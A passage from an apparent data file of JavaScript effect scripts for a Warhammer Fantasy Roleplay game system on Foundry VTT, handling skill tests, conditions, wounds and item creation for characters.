test.roll();","JXBUE0XuJOJNG7zE":"if (args.totalWoundLoss <= 7) return;\n\nlet options = {\n  appendTitle : \" – \" + this.effect.name,\n  skipTargets: true,\n  fields: {difficulty: 'average'},\n  characteristic: 'wp',\n}\n\nlet test = await args.actor.setupSkill('Cool', options);\nawait test.roll();\n\nif (!test.succeeded) {\n  const targetId = this.effect.getFlag(\"wfrp4e\", \"target\");\n  const target = canvas.scene.tokens.get(targetId);\n  await this.effect.delete();\n  args.extraMessages.push(`<b>${args.actor.name}</b> lost ${args.totalWoundLoss} Wounds to an attack, which caused it to let go of <b>${target.name}</b>.`);\n}","JZIn1dsKHFE3smJU":"let ablaze = parseInt(this.effect.sourceTest.result.SL) + 1\nargs.actor.addCondition(\"ablaze\", ablaze)","JaiC5P6nIgctOacH":"if (args.actor.system.details.species?.value?.toLowerCase() == \"dwarf\")\n{\n    args.weaponProperties.flaws.undamaging = true;\n}","JavuFNZ9Pj5elVLc":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet data = item.toObject();\ndata.system.specification.value = 4 - this.actor.characteristics.s.bonus\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","JeThJbOf6Xmbtgo1":"this.script.scriptMessage(await this.actor.applyBasicDamage(8 + parseInt(this.effect.sourceTest.result.SL), {suppressMsg : true}))\n\nlet test = await this.actor.setupSkill(\"Athletics\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}","JgCcgDVZX54slrWx":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Melee\")) || args.item?.isMelee || args.options.corruption","JhbZWZhOJ23yOBmG":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpentry)';\nconst difficulty = 'hard';\nconst target = 30;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","JibNjuQrJRnY0yf9":"return this.actor.flags.useless.rEye && this.actor.flags.useless.lEye && ([\"ws\", \"bs\"].includes(args.characteristic) || args.skill?.name?.includes(game.i18n.localize(\"NAME.Ride\")) || args.weapon || args.options.dodge)","JjDzMnUxaWQePIYh":"return args.characteristic != \"int\"","JjiPprLSlSmmB5Ga":"args.item.system.damage.value += \" + 1\"","Jjq3oPYbI26zjxME":"let location = this.item.system.location.key;\n\nif (location)\n{\n    let dropped = this.item.system.weaponsAtLocation;\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}\n\nlet roll = await new Roll(\"1d10\").roll()\n\nroll.toMessage(this.script.getChatData({flavor : `${this.effect.name} (Duration)`}));\n\nthis.effect.updateSource({\"duration.rounds\" : roll.total})","Jk7OHqx06oCUVAzb":"return ![\"Language (Magick)\", \"Channelling (Hysh)\"].includes(args.skill?.name) ","JmZQRvdWjm9ykYfn":"if (this.actor.hasCondition(\"surprised\"))\n{\n    this.actor.removeCondition(\"surprised\")\n    this.script.scriptMessage(`Cannot be Surprised`);\n}","Jnp5c09sPzDD61EK":"this.script.scriptNotification(`${args.actor.prototypeToken.name} must pass an <b>Average (+20) Willpower</b> Test to attack this target!`)\n\nreturn true; // No need to show this in the dialog","JstrA46EYSEuRSy5":"if (this.actor.has(game.i18n.localize(\"NAME.Undead\")) && this.actor.has(game.i18n.localize(\"NAME.Construct\")))\n   this.actor.addCondition(\"dead\")","JwYZJGkZMSM2M3Si":"if (args.totalWoundLoss > 0)\n{\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"hard\"}})\n    await test.roll()\n    if (test.failed)\n    {\n        args.totalWoundLoss += this.effect.sourceActor.system.characteristics.wp.bonus\n        args.modifiers.other.push({label : this.effect.name, value : this.effect.sourceActor.system.characteristics.wp.bonus})\n    }\n}","JwgFQmPQtXWAP94i":"this.actor.addCondition(\"fatigued\");","JyTxUG5dNW670Sf7":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.7mCcI3q7hgWcmbBU\")\nlet data = item.toObject();\ndata.system.location.key= this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n   \nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"stunned\")\n}","K06v93N4FXb70mB7":"args.item.system.encumbrance.value = Math.max(0, args.item.system.encumbrance.value - 1);","KD4nCSdSXJVJmk0R":"this.script.scriptMessage(await this.actor.applyBasicDamage(this.effect.sourceTest.result.damage, {suppressMsg : true}))\nawait this.actor.addCondition(\"ablaze\")","KF69WqF4PSEtpdb2":"args.fields.slBonus += 2;\n        ","KG4TxnXiLLpfWOQO":"args.fields.difficulty = \"average\"","KGK9vL1Yl0qmCeCN":"let specification = this.item.system.specification.value;\nlet choice = [];\n\nif (!specification || specification == \"Trained Skills\")\n{\n    choice = await ItemDialog.create(ItemDialog.objectToArray({\n        broken: \"Broken\",\n        drive: \"Drive\",\n        entertain: \"Entertain\",\n        fetch: \"Fetch\",\n        guard: \"Guard\",\n        home: \"Home\",\n        magic: \"Magic\",\n        mount: \"Mount\",\n        war: \"War\"\n    }, this.effect.img), \"unlimited\", \"Choose Training\");\n}\nelse \n{\n    choice = specification.split(\", \").map(i => {\n        return {\n            id : i.toLowerCase(),\n            name : i\n        }\n    });\n}\n\nif (choice.length)\n{\n    let changes = foundry.utils.deepClone(this.effect.changes);\n\n    for(let training of choice)\n    {\n        switch(training.id)\n        {\n            case \"broken\" : \n                let roll = await new Roll(\"2d10\").roll();   \n                roll.toMessage(this.script.getChatData());\n                changes.push({value : roll.total, mode : 2, key : \"system.characteristics.fel.modifier\"})\n\n                if (this.actor.type == \"creature\")\n                {\n                    let bestial = this.actor.itemTypes.trait.find(i => i.name == \"Bestial\");\n                    if (bestial)\n                    {\n                        bestial.update({\"system.disabled\" : true})\n                    }\n                }\n                break;\n\n            case \"drive\" : \n\n                break;\n\n            case \"entertain\" : \n\n                break;\n\n            case \"fetch\" : \n\n                break;\n\n            case \"guard\" : \n                let territorial = await fromUuid(\"Compendium.wfrp4e-core.items.Item.JIAe7i7dqTQBu4do\");\n                await this.actor.createEmbeddedDocuments(\"Item\", [territorial], {fromEffect: this.effect.id})\n                foundry.utils.setProperty(args, \"options.keepId\", true);\n                break;\n\n            case \"home\" : \n\n                break;\n\n            case \"magic\" : \n\n                break;\n\n            case \"mount\" : \n\n                break;\n\n            case \"war\" : \n                changes.push({value : 10, mode : 2, key : \"system.characteristics.ws.modifier\"})\n                break;\n        }\n    }\n    this.effect.updateSource({name : `${this.effect.name} (${choice.map(i => i.name).join(\", \")})`, changes, \"flags.wfrp4e.trained\" : choice.map(i => i.id)})\n    this.item.updateSource({\"system.specification.value\" : `${choice.map(i => i.name).join(\", \")}`})\n}","KICZPwLvbUSxbDrE":"let table = game.wfrp4e.tables.findTable(\"mutatemental\");\nif (!table)\n{\n\tui.notifications.error(\"Cannot find table with key: mutatemental\")\n}\nlet result = (await table.roll()).results[0];\nlet uuid = `Compendium.${result.documentCollection}.${result.documentId}`\nlet item = await fromUuid(uuid);\n\nif (item)\n{\n    this.script.scriptNotification(`${item.name} added`)\n    this.actor.createEmbeddedDocuments(\"Item\", [item])\n}\nelse \n{\n    ui.notifications.error(\"Item could not be found: \" + uuid)\n}","KIoVBinAZK8sMOqD":"\n                            let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty : \"average\"}, skipTargets: true, appendTitle :  \" - Wounded\"})\n                            await test.roll();\n                            if (test.failed)\n                            {\n                                fromUuid(\"Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb\").then(disease => {\n                                    this.actor.createEmbeddedDocuments(\"Item\", [disease.toObject()])\n                                    this.script.scriptNotification(\"Gained \" + disease.name)\n                                })\n                            }\n                            ","KJLAan0glJlyOyqF":"    this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 10,\n      \"bright\": 5,\n      \"alpha\": 0.5,\n      \"animation\": {\n          \"speed\": 4,\n          \"intensity\": 4,\n          \"type\": \"flame\",\n      },\n      \"color\": \"#ac9e6c\",\n  }}));","KPQfupKuaf4LCv4R":"const talents = await Promise.all([\"Schemer\", \"Second Sight\"].map(game.wfrp4e.utility.findTalent))\nthis.actor.createEmbeddedDocuments(\"Item\", talents, {fromEffect : this.effect.id})","KQmb5B27eJ1lkbVL":"return this.item.system.quantity.value > 0 && args.type != \"channelling\"","KQzbrpb0T5a7it4k":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.vMYEkrWj0ip6ZOdv\");\nlet data = item.toObject();\ndata.name += ` (Disease)`;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","KSjsDlsx3DD6cT16":"return args.skill?.name != game.i18n.localize(\"NAME.Bribery\");","KT670CjGBEprx2fO":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.RWJrupj9seau0w31\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","KTBVDHUndI3qDOXM":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"))\nawait test.roll();\nif (!test.succeeded)\n{\n    args.actor.addCondition(\"stunned\")\n}","KUx0deSF3xNzMucL":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Art\"));","KVpDUEjHhd3nLa0f":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"enrage-beast\"))\n}","KVuPduDztyMZQNt9":"args.fields.slBonus += this.actor.system.characteristics.ag.bonus","KXzDe7cN2vynHjJO":"this.actor.hasCondition(\"blinded\")?.delete();\nthis.actor.hasCondition(\"deafened\")?.delete()\nthis.actor.hasCondition(\"unconscious\")?.delete()","KkjkYAGI9Em1NgiQ":"if (this.item.system.quantity.value) \n{\n    this.item.system.reduceQuantity();\n    let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Heal\"), { appendTitle: ` - ${this.effect.name}`, skipTargets: true })\n    await test.roll();\n    if (test.succeeded) \n    {\n        let actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n        actor.applyEffect({ effectData: [this.item.effects.contents[0].convertToApplied()] })\n    }\n    else \n    {\n        this.script.scriptNotification(\"Heal Test failed!\", \"error\")\n    }\n}\nelse \n{\n    this.script.scriptNotification(\"None left!\", \"error\")\n}","KmngDrPD72xn22kZ":"if (this.actor.Species.toLowerCase() != \"skaven\") {\n    this.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - Used ${this.effect.name}`, fields: { difficulty: \"difficult\" } }).then(async test => {\n      await test.roll()\n      if (test.failed) \n      {\n        let toughnessLost = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n        this.actor.update({ \"system.characteristics.t.initial\": this.actor.characteristics.t.initial - toughnessLost })\n        this.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> lost ${toughnessLost} Toughness`)\n      }\n    })\n  }","KnwYZbeRSBA94hfl":"if (!args.flags.lostFingers)\n{\n\targs.flags.lostFingers = true;\n\targs.fields.modifier -= 5 * this.actor.flags.useless[this.item.system.location.key]\n}","KuUkUmOOLf05I4Bp":"this.actor.hasCondition(\"broken\")?.delete();\n","KuuWAhoSzk0rCxxw":"args.fields.modifier += -20;","KyUPYV1RXJxPOfyA":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"veasy\"}})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"fatigued\");\n}","KyswmGj1uG3QS3ng":"args.applyAP = false;","L1RMLvKtRPFtnczI":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.MGEPI4jNhymNIRVz\");\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","L2cdQppcPwxz24hN":"return !args.weapon","L89UcafRHqUfxoux":"let injury = await fromUuid(\"Compendium.wfrp4e-core.items.3S4OYOZLauXctmev\")\ninjury.updateSource({\"system.location.key\" : this.item.system.location.key})\nthis.actor.createEmbeddedDocuments(\"Item\", [injury], {fromEffect: this.effect.id})","L9eAtDyaoHvqryk4":"return args.skill?.name != game.i18n.localize(\"NAME.Intimidate\");","LAyLbcC0lOPwZP3U":"this.actor.addCondition(\"ablaze\", parseInt(this.effect.sourceTest.result.SL))","LHUUXfZVLBhWqRvb":"this.actor.status.addArmour(5, {magical: true, source : this.effect})","LLqAT9wEUGMLfDhU":"return !args.item?.system.isRanged","LOL2TGf8p8KxP14D":"let wind = this.effect.name.split(\" \")[2]\nreturn args.type != \"cast\" || game.wfrp4e.config.magicWind[args.item.system.lore.value] != wind;","LQEWSN5KnHHATPsf":"if (args.totalWoundLoss > 0)\n{\n    this.script.scriptMessage(`<b>${args.actor.name}</b> must pass an <b>Easy (+40) Endurance</b> Test or gain a @UUID[Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb]{Festering Wound}`, {whisper: ChatMessage.getWhisperRecipients(\"GM\")})\n}","LXEUhHuXe8keEPI9":"let test = await this.actor.setupCharacteristic(\"wp\", {fields: {difficulty : \"average\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n\tlet stuns = Math.max(1, Math.abs(test.result.SL))\n\tthis.actor.addCondition(\"stunned\", stuns)\n}","LeKLtvEDrWh4yHsx":"return args.skill?.name == game.i18n.localize(\"NAME.CharmAnimal\") || args.skill?.name.includes(game.i18n.localize(\"NAME.AnimalTraining\"));","LedRsrVo2f7lm3Ix":"return args.skill?.name == game.i18n.localize(\"NAME.Intimidate\");","Lg1oRg4oNRvucsvi":"return !(args.skill?.name == game.i18n.localize(\"NAME.Climb\") || args.skill?.name == game.i18n.localize(\"NAME.Athletics\"))","LjXPlgdXBdllnA3i":"return ![\"s\", \"t\"].includes(args.characteristic)","LjfScVGBf0Egr70E":"let animalCare = this.actor.itemTypes.skill.find(s => s.name === game.i18n.localize(\"NAME.AnimalCare\"));\nlet animalTrainings = this.actor.itemTypes.skill.filter(s => s.name.includes(game.i18n.localize(\"NAME.AnimalTraining\")));\n\nif (animalCare) \n  animalCare.system.modifier.value += 20;\n\nfor (let training of animalTrainings) {\n  training.system.modifier.value += 30;\n}","LkPtgN9A36OI6Frh":"return args.skill?.name == game.i18n.localize(\"NAME.Leadership\");","LlRhPGorLl5qJCU8":"if (this.actor.hasCondition(\"prone\")) \n{\n    this.actor.addCondition(\"unconscious\");\n}\nelse \n{\n    this.actor.addCondition(\"prone\");\n}","Lm9IBkc918Duw3US":"let career = this.actor.itemTypes.career.find(c => c.getFlag(\"wfrp4e\", \"doubleLife\"))\n\nif(career)\n{\n    career.system.current.value = true;\n}","Lp261O9fgEXmgPf3":"// If this actor wins a defending test, swap the test\nif (!args.opposedTest.result.swapped && args.opposedTest.result.winner == \"defender\" && args.opposedTest.attackerTest.result.damage)\n{\n    await args.opposedTest.swap(this.effect.label);\n}","Lpv2N9LK9loeumiW":"if (this.actor.uuid != this.effect.sourceActor.uuid)\n{\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Athletics\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty: \"hard\"}, context : {failure : `<strong>${this.effect.name}</strong>: cannot move or take actions`}}).then(test => {\n       test.roll();\n    })\n}","Lrb1S2aK7SFVD0C7":"if (args.totalWoundLoss > 0)\n{\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if (test.failed)\n    {\n        await args.actor.addCondition(\"fatigued\");\n    }\n}","Lu27iXtJVkrJ8bOx":"return !args.skill?.name?.includes(game.i18n.localize(\"NAME.Stealth\"))","LxdLkPxH3SFvYrCJ":"if (args.effect.conditionId == \"ablaze\")\n{\n     args.data.formula += ` - ${this.actor.system.characteristics.t.bonus}`\n}","LyAK0dVDS5L09yq2":"let caster = this.effect.sourceActor\n\nif (caster)\n{\n    let bonus = caster.system.characteristics.wp.bonus\n    this.actor.modifyWounds(bonus)\n\n    this.script.scriptMessage(`<strong>${this.actor.prototypeToken.name}</strong> regains ${bonus} Wounds`)\n}","M0XhKnWjG14pk3iH":"return !args.skill?.name.includes(\"Channelling\") && args.type != \"channelling\" && args.skill?.name != game.i18n.localize(\"NAME.Charm\") && !args.skill?.name.includes(\"Language (Magick)\") && args.type != \"cast\"","M2FshTX4PjKFVU8y":"args.flags.earCount = Number.isNumeric(args.flags.earCount) ? args.flags.earCount+1 : 1;\nif (args.characteristic == \"fel\")\n{\n\targs.fields.modifier -= 5;\n}\nif (args.flags.earCount == 2 && args.skill?.name == game.i18n.localize(\"NAME.Perception\"))\n{\n\targs.fields.modifier -= 20;\n}\n","M5bh0heeafA2fQQ8":"if (args.test.spell?.getFlag(\"wfrp4e\", \"boonOfTzeentch\"))\n{\n    if (args.test.result.minormis || args.test.result.majormis || args.test.result.catastrophicmis)\n    {\n        this.script.scriptMessage(`<strong>${this.effect.name}</strong> quits your mind in disgust and erases itself from your grimoire!`)\n        this.effect.sourceItem.delete();\n    }\n}","M9VgeYGiUO97ZUW4":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.hCadFsTRvLN9faaY\")\nlet data = item.toObject();\ndata.system.location.value = \"Jaw\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (!test.succeeded)\n{\n\targs.actor.addCondition(\"unconscious\")\n}\n\n","MCK6WyjwYT28lsTN":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.u0CFf3xwiyidD9T5\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","MDLttXplnNthncGr":"return args.type == \"cast\" && [\"death\", \"necromancy\", \"life\", \"light\", \"heavens\"].includes(args.spell?.system.lore.value)","MFKhU9vp8bQpHP3I":"let value = parseInt(this.item.specification.value)\nlet name = this.actor.prototypeToken.name\n\nif (game.user.isGM && game.user.targets.size)\n{\n  game.user.targets.forEach(t => {\n    t.actor.applyTerror(value, name)\n  })\n  game.user.updateTokenTargets([]);\n}\nelse \n{\n  game.wfrp4e.utility.postTerror(value, name)\n}","MI2GgNi3fZtUCtQD":"return [\"int\", \"wp\"].includes(args.characteristic)","MIhYSuJ6MI9B65UT":"let specification = Number(this.item.specification.value) || 1;\nargs.actor.system.status.wounds.max += Math.floor(args.actor.system.status.wounds.max * 0.3 * specification);\nargs.actor.system.status.carries.max -= Math.floor(args.actor.system.status.carries.max * 0.1 * specification);\nargs.actor.system.details.price.gc += Math.floor(args.actor.system.details.price.gc * 0.2 * specification);","MJB6WbZSF6Briz30":"return args.item?.name == game.i18n.localize(\"NAME.Leadership\")","MMv2B8TH7jxNCtdl":"let actor = this.actor;\n                            let effect = this.effect;\n                            let bleedingAmt;\n                            let bleedingRoll;\n                            let msg = \"\"\n\n                            let damage = effect.conditionValue;\n                            let scriptArgs = {msg, damage};\n                            await Promise.all(actor.runScripts(\"preApplyCondition\", {effect, data : scriptArgs}))\n                            msg = scriptArgs.msg;\n                            damage = scriptArgs.damage;\n                            msg += await actor.applyBasicDamage(damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, minimumOne : false, suppressMsg : true})\n\n                            if (actor.status.wounds.value == 0 && !actor.hasCondition(\"unconscious\"))\n                            {\n                                await actor.addCondition(\"unconscious\")\n                                msg += \"<br>\" + game.i18n.format(\"BleedUnc\", {name: actor.prototypeToken.name })\n                            }\n\n                            if (actor.hasCondition(\"unconscious\"))\n                            {\n                                bleedingAmt = effect.conditionValue;\n                                bleedingRoll = (await new Roll(\"1d100\").roll()).total;\n                                if (bleedingRoll <= bleedingAmt * 10)\n                                {\n                                    msg += \"<br>\" + game.i18n.format(\"BleedFail\", {name: actor.prototypeToken.name}) + \" (\" + game.i18n.localize(\"Rolled\") + \" \" + bleedingRoll + \")\";\n                                    await actor.addCondition(\"dead\")\n                                }\n                                else if (bleedingRoll % 11 == 0)\n                                {\n                                    msg += \"<br>\" + game.i18n.format(\"BleedCrit\", { name: actor.prototypeToken.name } ) + \" (\" + game.i18n.localize(\"Rolled\") + bleedingRoll + \")\"\n                                    await actor.removeCondition(\"bleeding\")\n                                }\n                                else\n                                {\n                                    msg += \"<br>\" + game.i18n.localize(\"BleedRoll\") + \": \" + bleedingRoll;\n                                }\n                            }\n\n                            await Promise.all(actor.runScripts(\"applyCondition\", {effect, data : {bleedingRoll}}))\n                            if (args.suppressMessage)\n                            {\n                                let messageData = game.wfrp4e.utility.chatDataSetup(msg);\n                                messageData.speaker = {alias: this.effect.name}\n                                messageData.flavor = this.effect.name;\n                                return messageData\n                            }\n                            else\n                            {\n                                return this.script.scriptMessage(msg)\n                            }\n                            ","MMx8f5uJ15XOgJGg":"return args.skill?.name !== game.i18n.localize(\"NAME.Row\") && args.skill?.name !== game.i18n.localize(\"NAME.Swim\") && !args.skill?.name.includes(game.i18n.localize(\"NAME.Sail\"));","MSJWJEUrX7ZmMvAD":"return !(args.skill?.name.includes(game.i18n.localize(\"NAME.Ranged\")) || args.item?.isRanged || args.item?.name == game.i18n.localize(\"NAME.Charm\"))","McLR9YcgVUG3MooC":"args.applyTB = false;","Me1wS5XdqUEy7OGt":"let loc = (await game.wfrp4e.tables.rollTable(\"hitloc\")).result;\nlet critTable = `crit${this.generalizeTable(loc)`;\nlet crit = (await game.wfrp4e.tables.rollTable(critTable)).result;\n\nthis.script.scriptMessage(`{this.actor.name} suffers a ${crit} (location : ${loc}). Do not apply bleeding or any additonnal wounds.`);","MfxWXZwaZUjGSBqw":"if (this.actor.hasCondition(\"ablaze\"))\n{\n    this.script.scriptNotification(\"Immune to Ablaze\")\n    await this.actor.hasCondition(\"ablaze\")?.delete()\n}","MfxzwJz2o9ho2hOM":"return args.skill?.name == \"Lore (Apothecary)\"","MgMMoC4Umpg7fmNI":"// Apply changes when the mask is worn\n\nif (args.equipped) {  \n  this.actor.createEmbeddedDocuments(\"ActiveEffect\", [this.item.effects.contents[1]?.convertToApplied()])  \n  this.script.scriptMessage(`${this.actor.name} dons the <strong>${this.item.name}</strong>. <br>\n      They cannot cast Spells or pray for Blessings and Miracles.<br>\n      If they wear the mask for more than an hour or benefit from any of its effects, they are exposed to @Corruption[moderate]{Moderate Corruption}. \n      `,\n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")}) \n}\n\n// Notify of lingering effects when mask is removed\nelse if (!args.equipped)\n{\n    await this.item.effects.contents[0].delete();\n    await this.item.update({name : this.item.name += \" (Used)\"})\n    this.script.scriptMessage(`<strong>${this.item.name}</strong> on ${this.actor.name} has been taken off and loses its properties. However, the effects last for [[1d10+4]] days, after which they should be manually removed.`, \n    {whisper: ChatMessage.getWhisperRecipients(\"GM\")}\n    )\n    \n}\n\n\n\n","MgTqCMRjxhezT73T":"return args.fields.hitLocation == \"head\" && args.weapon?.system.properties.qualities.pummel","MgZreqq3Jua10c8s":"return ![\"ws\", \"bs\", \"s\", \"fel\", \"ag\", \"t\", \"dex\"].includes(args.characteristic)","Mhb67xufvA9uWO21":"let actorSize = game.wfrp4e.config.actorSizeNums[args.actor.details.size.value]\nlet attackerSize = game.wfrp4e.config.actorSizeNums[args.attacker.details.size.value]\n\nif (attackerSize > actorSize)\n{\n   args.actor.addCondition(\"prone\")\n   this.script.scriptMessage(`<strong>Tail Attack</strong>: ${args.actor.prototypeToken.name} is now <strong>Prone</strong>`)\n}","Mir4FMHQRdVqazAF":"let actorSize = game.wfrp4e.config.actorSizeNums[args.actor.details.size.value]\nlet attackerSize = game.wfrp4e.config.actorSizeNums[args.attacker.details.size.value]\n\nif (attackerSize > actorSize)\n{\n   let msg = `<b>Tongue Attack</b>: ${args.actor.prototypeToken.name} is now @Condition[Entangled]`;\n   await args.actor.addCondition(\"entangled\");\n   if (actorSize <= 2)\n   {\n       msg += `and @Condition[Engaged]`\n   }\n   this.script.scriptMessage(msg, {speaker : {alias: args.attacker.prototypeToken.name}})\n}","MkEcdViivk7abf1x":"args.actor.flags.meleeDamageIncrease += 1","MnXny8SCh6OceJc9":"return args.characteristic == \"int\"","MnqQkXVp20Lw84I1":"let test = await this.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"difficult\"}})\nawait test.roll();\nif (test.failed)\n{\n    this.script.scriptMessage(await this.actor.applyBasicDamage(3, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true}))\n}","Mp8UjuCLa9jdzhBS":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\nif (test.failed)\n{\n    if (!this.actor.hasCondition(\"fatigued\"))\n    {\n        await this.actor.addCondition(\"fatigued\");\n    }\n    else\n    {\n        await this.actor.addCondition(\"blinded\");\n        await this.actor.addCondition(\"deafened\");\n    }\n    \n    if (((this.actor.hasCondition(\"blinded\").conditionValue || 0) + (this.actor.hasCondition(\"deafened\").conditionValue || 0)) > this.actor.system.characteristics.i.bonus)\n    {\n        await this.actor.addCondition(\"unconscious\");        \n    }\n}","Msygc7oQQPB5fw0b":"let test = this.effect.sourceTest;\nif (test.failed && (test.result.roll % 11 == 0 || test.result.roll == 100))\n{\n\tlet points = await new Roll(\"1d10\").roll();\n\tgame.dice3d?.showForRoll(points)\n\tthis.actor.update({\"system.status.corruption.value\" : this.actor.system.status.corruption.value + points.total})\n\tthis.script.scriptMessage(`Gains ${points.total} Corruption`)\n}\nelse \n{\n\tlet points = this.effect.sourceTest.result.overcast.usage.other.current;\n\tthis.actor.update({\"system.status.corruption.value\" : this.actor.system.status.corruption.value - points})\n\tthis.script.scriptMessage(`Loses ${points} Corruption`)\n}","MwUzyAgd0yPnmZCH":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.klCJX0mNpXYH5AIx\")\nlet data = item.toObject();   \ndata.name = data.name.replace(\"Target\", \"Strangers\");\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id});","Myl1Ishu9GBraYUZ":"this.actor.removeCondition(\"bleeding\")","N2MeOlf0GjPiRcSb":"let test = await this.actor.setupCharacteristic(\"dex\", {context : {failure : \"Drops the item\"}})\nawait test.roll();","N7nGncsPrTz2ZbDA":"return !args.options.dodge || !this.actor.isMounted","N8hA6ysHCTlLd8Kj":"let characteristics = {\n    \"ws\" : 0,\n    \"bs\" : 0,\n    \"s\" : 0,\n    \"t\" : 5,\n    \"i\" : 15,\n    \"ag\" : 0,\n    \"dex\" : 10,\n    \"int\" : 15,\n    \"wp\" : 15,\n    \"fel\" : 0\n}\nlet skills = [\"Channelling\", \"Cool\", \"Dodge\", \"Entertain (Storytelling)\", \"Intuition\", \"Language (Magick)\", \"Lore (Magic)\", \"Perception\"]\nlet skillAdvancements = [5, 15, 10, 10, 15, 10, 10, 20]\nlet talents = [\"Arcane Magic\", \"Petty Magic\", \"Second Sight\"]\nlet trappings = [\"Hand Weapon\", \"Quarterstaff\", \"Ritual Dress incorporating many ingredients and fetishes\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = 